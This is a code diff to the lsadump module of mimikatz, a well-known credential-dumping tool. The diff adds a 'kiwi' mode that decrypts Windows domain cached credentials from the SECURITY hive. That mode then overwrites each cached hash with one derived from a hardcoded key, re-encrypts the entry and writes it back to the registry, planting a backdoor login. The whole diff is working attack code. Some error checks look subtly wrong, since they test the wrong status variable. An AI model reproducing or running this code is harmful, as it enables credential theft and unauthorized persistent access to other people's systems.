@@ -15,8 +15,32 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 
 const KUHL_M kuhl_m_lsadump = {
 	L"lsadump", L"LsaDump module", NULL,
-	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, NULL, NULL
+	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, kuhl_m_lsadump_init, NULL
 };
+
+PHMACWITHSHA HMACwithSHA = NULL;
+PAESCTSDECRYPTMSG aesCTSDecryptMsg = NULL;
+PAESCTSENCRYPTMSG aesCTSEncryptMsg = NULL;
+PPBKDF2 PBKDF2 = NULL;
+
+NTSTATUS kuhl_m_lsadump_init()
+{
+	HMODULE hModule;
+	if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
+	{
+		if(hModule = GetModuleHandle(L"cryptdll"))
+		{
+			aesCTSDecryptMsg = (PAESCTSDECRYPTMSG) GetProcAddress(hModule, "aesCTSDecryptMsg");
+			aesCTSEncryptMsg = (PAESCTSENCRYPTMSG) GetProcAddress(hModule, "aesCTSEncryptMsg");
+			HMACwithSHA = (PHMACWITHSHA) GetProcAddress(hModule, "HMACwithSHA");
+			PBKDF2 = (PPBKDF2) GetProcAddress(hModule, "PBKDF2");
+		}
+
+		if(!(aesCTSDecryptMsg && aesCTSEncryptMsg && HMACwithSHA && PBKDF2))
+			return STATUS_NOT_FOUND;
+	}
+	return STATUS_SUCCESS;
+}
 
 NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 {
@@ -94,8 +118,9 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 	HKEY hSystemBase, hSecurityBase;
 	BYTE sysKey[SYSKEY_LENGTH];
 	BOOL isKeyOk = FALSE;
+	BOOL isKiwi = kull_m_string_args_byName(argc, argv, L"kiwi", NULL, NULL);
 
-	if(argc)
+	if(argc && !isKiwi)
 	{
 		hDataSystem = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 		if(hDataSystem != INVALID_HANDLE_VALUE)
@@ -111,7 +136,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 						{
 							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, &hSecurity))
 							{
-								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache);
+								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache, FALSE);
 								kull_m_registry_close(hSecurity);
 							}
 							CloseHandle(hDataSecurity);
@@ -133,7 +158,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 				{
 					if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurityBase))
 					{
-						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache);
+						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache, isKiwi);
 						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
 					}
 					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
@@ -463,7 +488,7 @@ BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolic
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache)
+BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN BOOL kiwime)
 {
 	BOOL status = FALSE;
 	HKEY hPolicy, hPolRev, hEncKey;
@@ -519,7 +544,7 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 									MD5Init(&md5ctx);
 									MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
 									for(i = 0; i < 1000; i++)
-										MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_NT5_IV_SIZE);
+										MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_IV_SIZE);
 									MD5Final(&md5ctx);
 									data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
 									if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
@@ -547,7 +572,7 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 			if(secretsOrCache)
 				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
 			else
-				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key);
+				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, kiwime);
 		}
 		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
 	}
@@ -626,28 +651,61 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
+NTSTATUS kuhl_m_lsadump_get_dcc(PBYTE dcc, PBYTE ntlm, PUNICODE_STRING Username, DWORD realIterations)
+{
+	NTSTATUS result;
+	LSA_UNICODE_STRING HashAndLowerUsername;
+	LSA_UNICODE_STRING LowerUsername;
+	BYTE buffer[LM_NTLM_HASH_LENGTH];
+
+	result = RtlDowncaseUnicodeString(&LowerUsername, Username, TRUE);
+	if(NT_SUCCESS(result))
+	{
+		HashAndLowerUsername.Length = HashAndLowerUsername.MaximumLength = LowerUsername.Length + LM_NTLM_HASH_LENGTH;
+		if(HashAndLowerUsername.Buffer = (PWSTR) LocalAlloc(LPTR, HashAndLowerUsername.MaximumLength))
+		{
+			RtlCopyMemory(HashAndLowerUsername.Buffer, ntlm, LM_NTLM_HASH_LENGTH);
+			RtlCopyMemory((PBYTE) HashAndLowerUsername.Buffer + LM_NTLM_HASH_LENGTH, LowerUsername.Buffer, LowerUsername.Length);
+			result = RtlDigestNTLM(&HashAndLowerUsername, dcc);
+			if(NT_SUCCESS(result))
+			{
+				if(realIterations)
+				{
+					result = PBKDF2(dcc, LM_NTLM_HASH_LENGTH, LowerUsername.Buffer, LowerUsername.Length, realIterations, LM_NTLM_HASH_LENGTH, buffer);
+					if(NT_SUCCESS(result))
+						RtlCopyMemory(dcc, buffer, LM_NTLM_HASH_LENGTH);
+				}
+			}
+			LocalFree(HashAndLowerUsername.Buffer);
+		}
+		RtlFreeUnicodeString(&LowerUsername);
+	}
+	return result;
+}
+
+BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, BOOL kiwime)
 {
 	BOOL status = FALSE;
 	HKEY hValue, hCache;
-	DWORD i, j, szNLKM, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded;
+	DWORD i, j = 10240, szNLKM, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
 	PVOID pNLKM;
 	wchar_t * secretName;
 	PMSCACHE_ENTRY pMsCacheEntry;
-	PBYTE pMsCacheData;
 	HCRYPTPROV hContext;
 	HCRYPTKEY hKey;
 	AES_128_KEY_BLOB keyBlob = {{PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_128}, AES_128_KEY_SIZE};
-	DWORD s1;
 	NTSTATUS nStatus;
 	BYTE digest[MD5_DIGEST_LENGTH];
 	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
-	
+	DWORD type;
+	BYTE kiwiKey[] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6};
+	LSA_UNICODE_STRING usr;
+
 	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", 0, KEY_READ, &hValue))
 	{
 		if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
 		{
-			if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ, &hCache))
+			if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ | (kiwime ? KEY_WRITE : 0), &hCache))
 			{
 				if(lsaKeysStream)
 				{
@@ -673,12 +731,10 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 							{
 								szSecretName = szMaxValueNameLen;
 								szSecret = szMaxValueLen;
-								if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, NULL, (LPBYTE) pMsCacheEntry, &szSecret))
+								if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
 								{
 									if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || (_wcsnicmp(secretName, L"NL$IterationCount", 17) == 0) || !(pMsCacheEntry->flags & 1))
 										continue;
-
-									pMsCacheData = (PBYTE) pMsCacheEntry->enc_data;
 
 									kprintf(L"\n[%s - ", secretName);
 									kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
@@ -686,39 +742,76 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 									
 									if(lsaKeysStream) // NT 6
 									{
-										RtlCopyMemory(keyBlob.key, pNLKM, AES_128_KEY_SIZE);
-										if(CryptAcquireContext(&hContext, NULL, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+										if(MIMIKATZ_NT_MAJOR_VERSION >= 6)
 										{
-											if(CryptImportKey(hContext, (LPBYTE) &keyBlob, sizeof(AES_128_KEY_BLOB), 0, 0, &hKey))
+											s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
+											RtlCopyMemory(digest, pMsCacheEntry->iv, LAZY_IV_SIZE);
+											nStatus = aesCTSDecryptMsg(AES_128_KEY_SIZE, pNLKM, s1, pMsCacheEntry->enc_data, digest); 
+											if(NT_SUCCESS(status))
 											{
-												if(status = CryptSetKeyParam(hKey, KP_IV, pMsCacheEntry->iv, 0))
+												kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
+												if(kiwime)
 												{
-													s1 = sizeof(MSCACHE_DATA) + pMsCacheEntry->szUserName + 2 * ((pMsCacheEntry->szUserName / sizeof(wchar_t)) % 2) + pMsCacheEntry->szDomainName;
-													s1 += s1 % AES_BLOCK_SIZE;
-
-													if(s1 <= szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data))
+													kprintf(L"> Kiwi mode...\n");
+													usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
+													usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
+													if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, j)))
 													{
-														for(j = 0; status && (j < s1); j+= AES_BLOCK_SIZE)
+														kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+														status = HMACwithSHA(pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, (PVOID *) &pMsCacheEntry->cksum, MD5_DIGEST_LENGTH);
+														if(NT_SUCCESS(status))
 														{
-															szNeeded = AES_BLOCK_SIZE;
-															status = CryptDecrypt(hKey, 0, FALSE, 0, pMsCacheEntry->enc_data + j, &szNeeded);
+															kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+															RtlCopyMemory(digest, pMsCacheEntry->iv, LAZY_IV_SIZE);
+															nStatus = aesCTSEncryptMsg(AES_128_KEY_SIZE, pNLKM, s1, pMsCacheEntry->enc_data, digest); 
+															if(NT_SUCCESS(status))
+															{
+																nStatus = RegSetValueEx(hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret);
+																if(nStatus == ERROR_SUCCESS)
+																	kprintf(L"> OK!\n");
+																else PRINT_ERROR(L"RegSetValueEx: 0x%08x\n", nStatus);
+															}
 														}
-														
-														if(status)
-															kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
-														else PRINT_ERROR_AUTO(L"CryptDecrypt");
 													}
 												}
-												else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
-												CryptDestroyKey(hKey);
 											}
-											else PRINT_ERROR_AUTO(L"CryptImportKey");
-											CryptReleaseContext(hContext, 0);
+										}
+										else
+										{
+											RtlCopyMemory(keyBlob.key, pNLKM, AES_128_KEY_SIZE);
+											if(CryptAcquireContext(&hContext, NULL, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+											{
+												if(CryptImportKey(hContext, (LPBYTE) &keyBlob, sizeof(AES_128_KEY_BLOB), 0, 0, &hKey))
+												{
+													if(status = CryptSetKeyParam(hKey, KP_IV, pMsCacheEntry->iv, 0))
+													{
+														s1 = sizeof(MSCACHE_DATA) + pMsCacheEntry->szUserName + 2 * ((pMsCacheEntry->szUserName / sizeof(wchar_t)) % 2) + pMsCacheEntry->szDomainName;
+														s1 += s1 % AES_BLOCK_SIZE;
+
+														if(s1 <= szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data))
+														{
+															for(j = 0; status && (j < s1); j+= AES_BLOCK_SIZE)
+															{
+																szNeeded = AES_BLOCK_SIZE;
+																status = CryptDecrypt(hKey, 0, FALSE, 0, pMsCacheEntry->enc_data + j, &szNeeded);
+															}
+
+															if(status)
+																kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
+															else PRINT_ERROR_AUTO(L"CryptDecrypt");
+														}
+													}
+													else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
+													CryptDestroyKey(hKey);
+												}
+												else PRINT_ERROR_AUTO(L"CryptImportKey");
+												CryptReleaseContext(hContext, 0);
+											}
 										}
 									}
 									else // NT 5
 									{
-										kuhl_m_lsadump_hmac_md5(pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_NT5_IV_SIZE, digest);
+										kuhl_m_lsadump_hmac_md5(pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, digest);
 										data.Length = data.MaximumLength = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
 										data.Buffer = pMsCacheEntry->enc_data;
 										nStatus = RtlEncryptDecryptRC4(&data, &key);
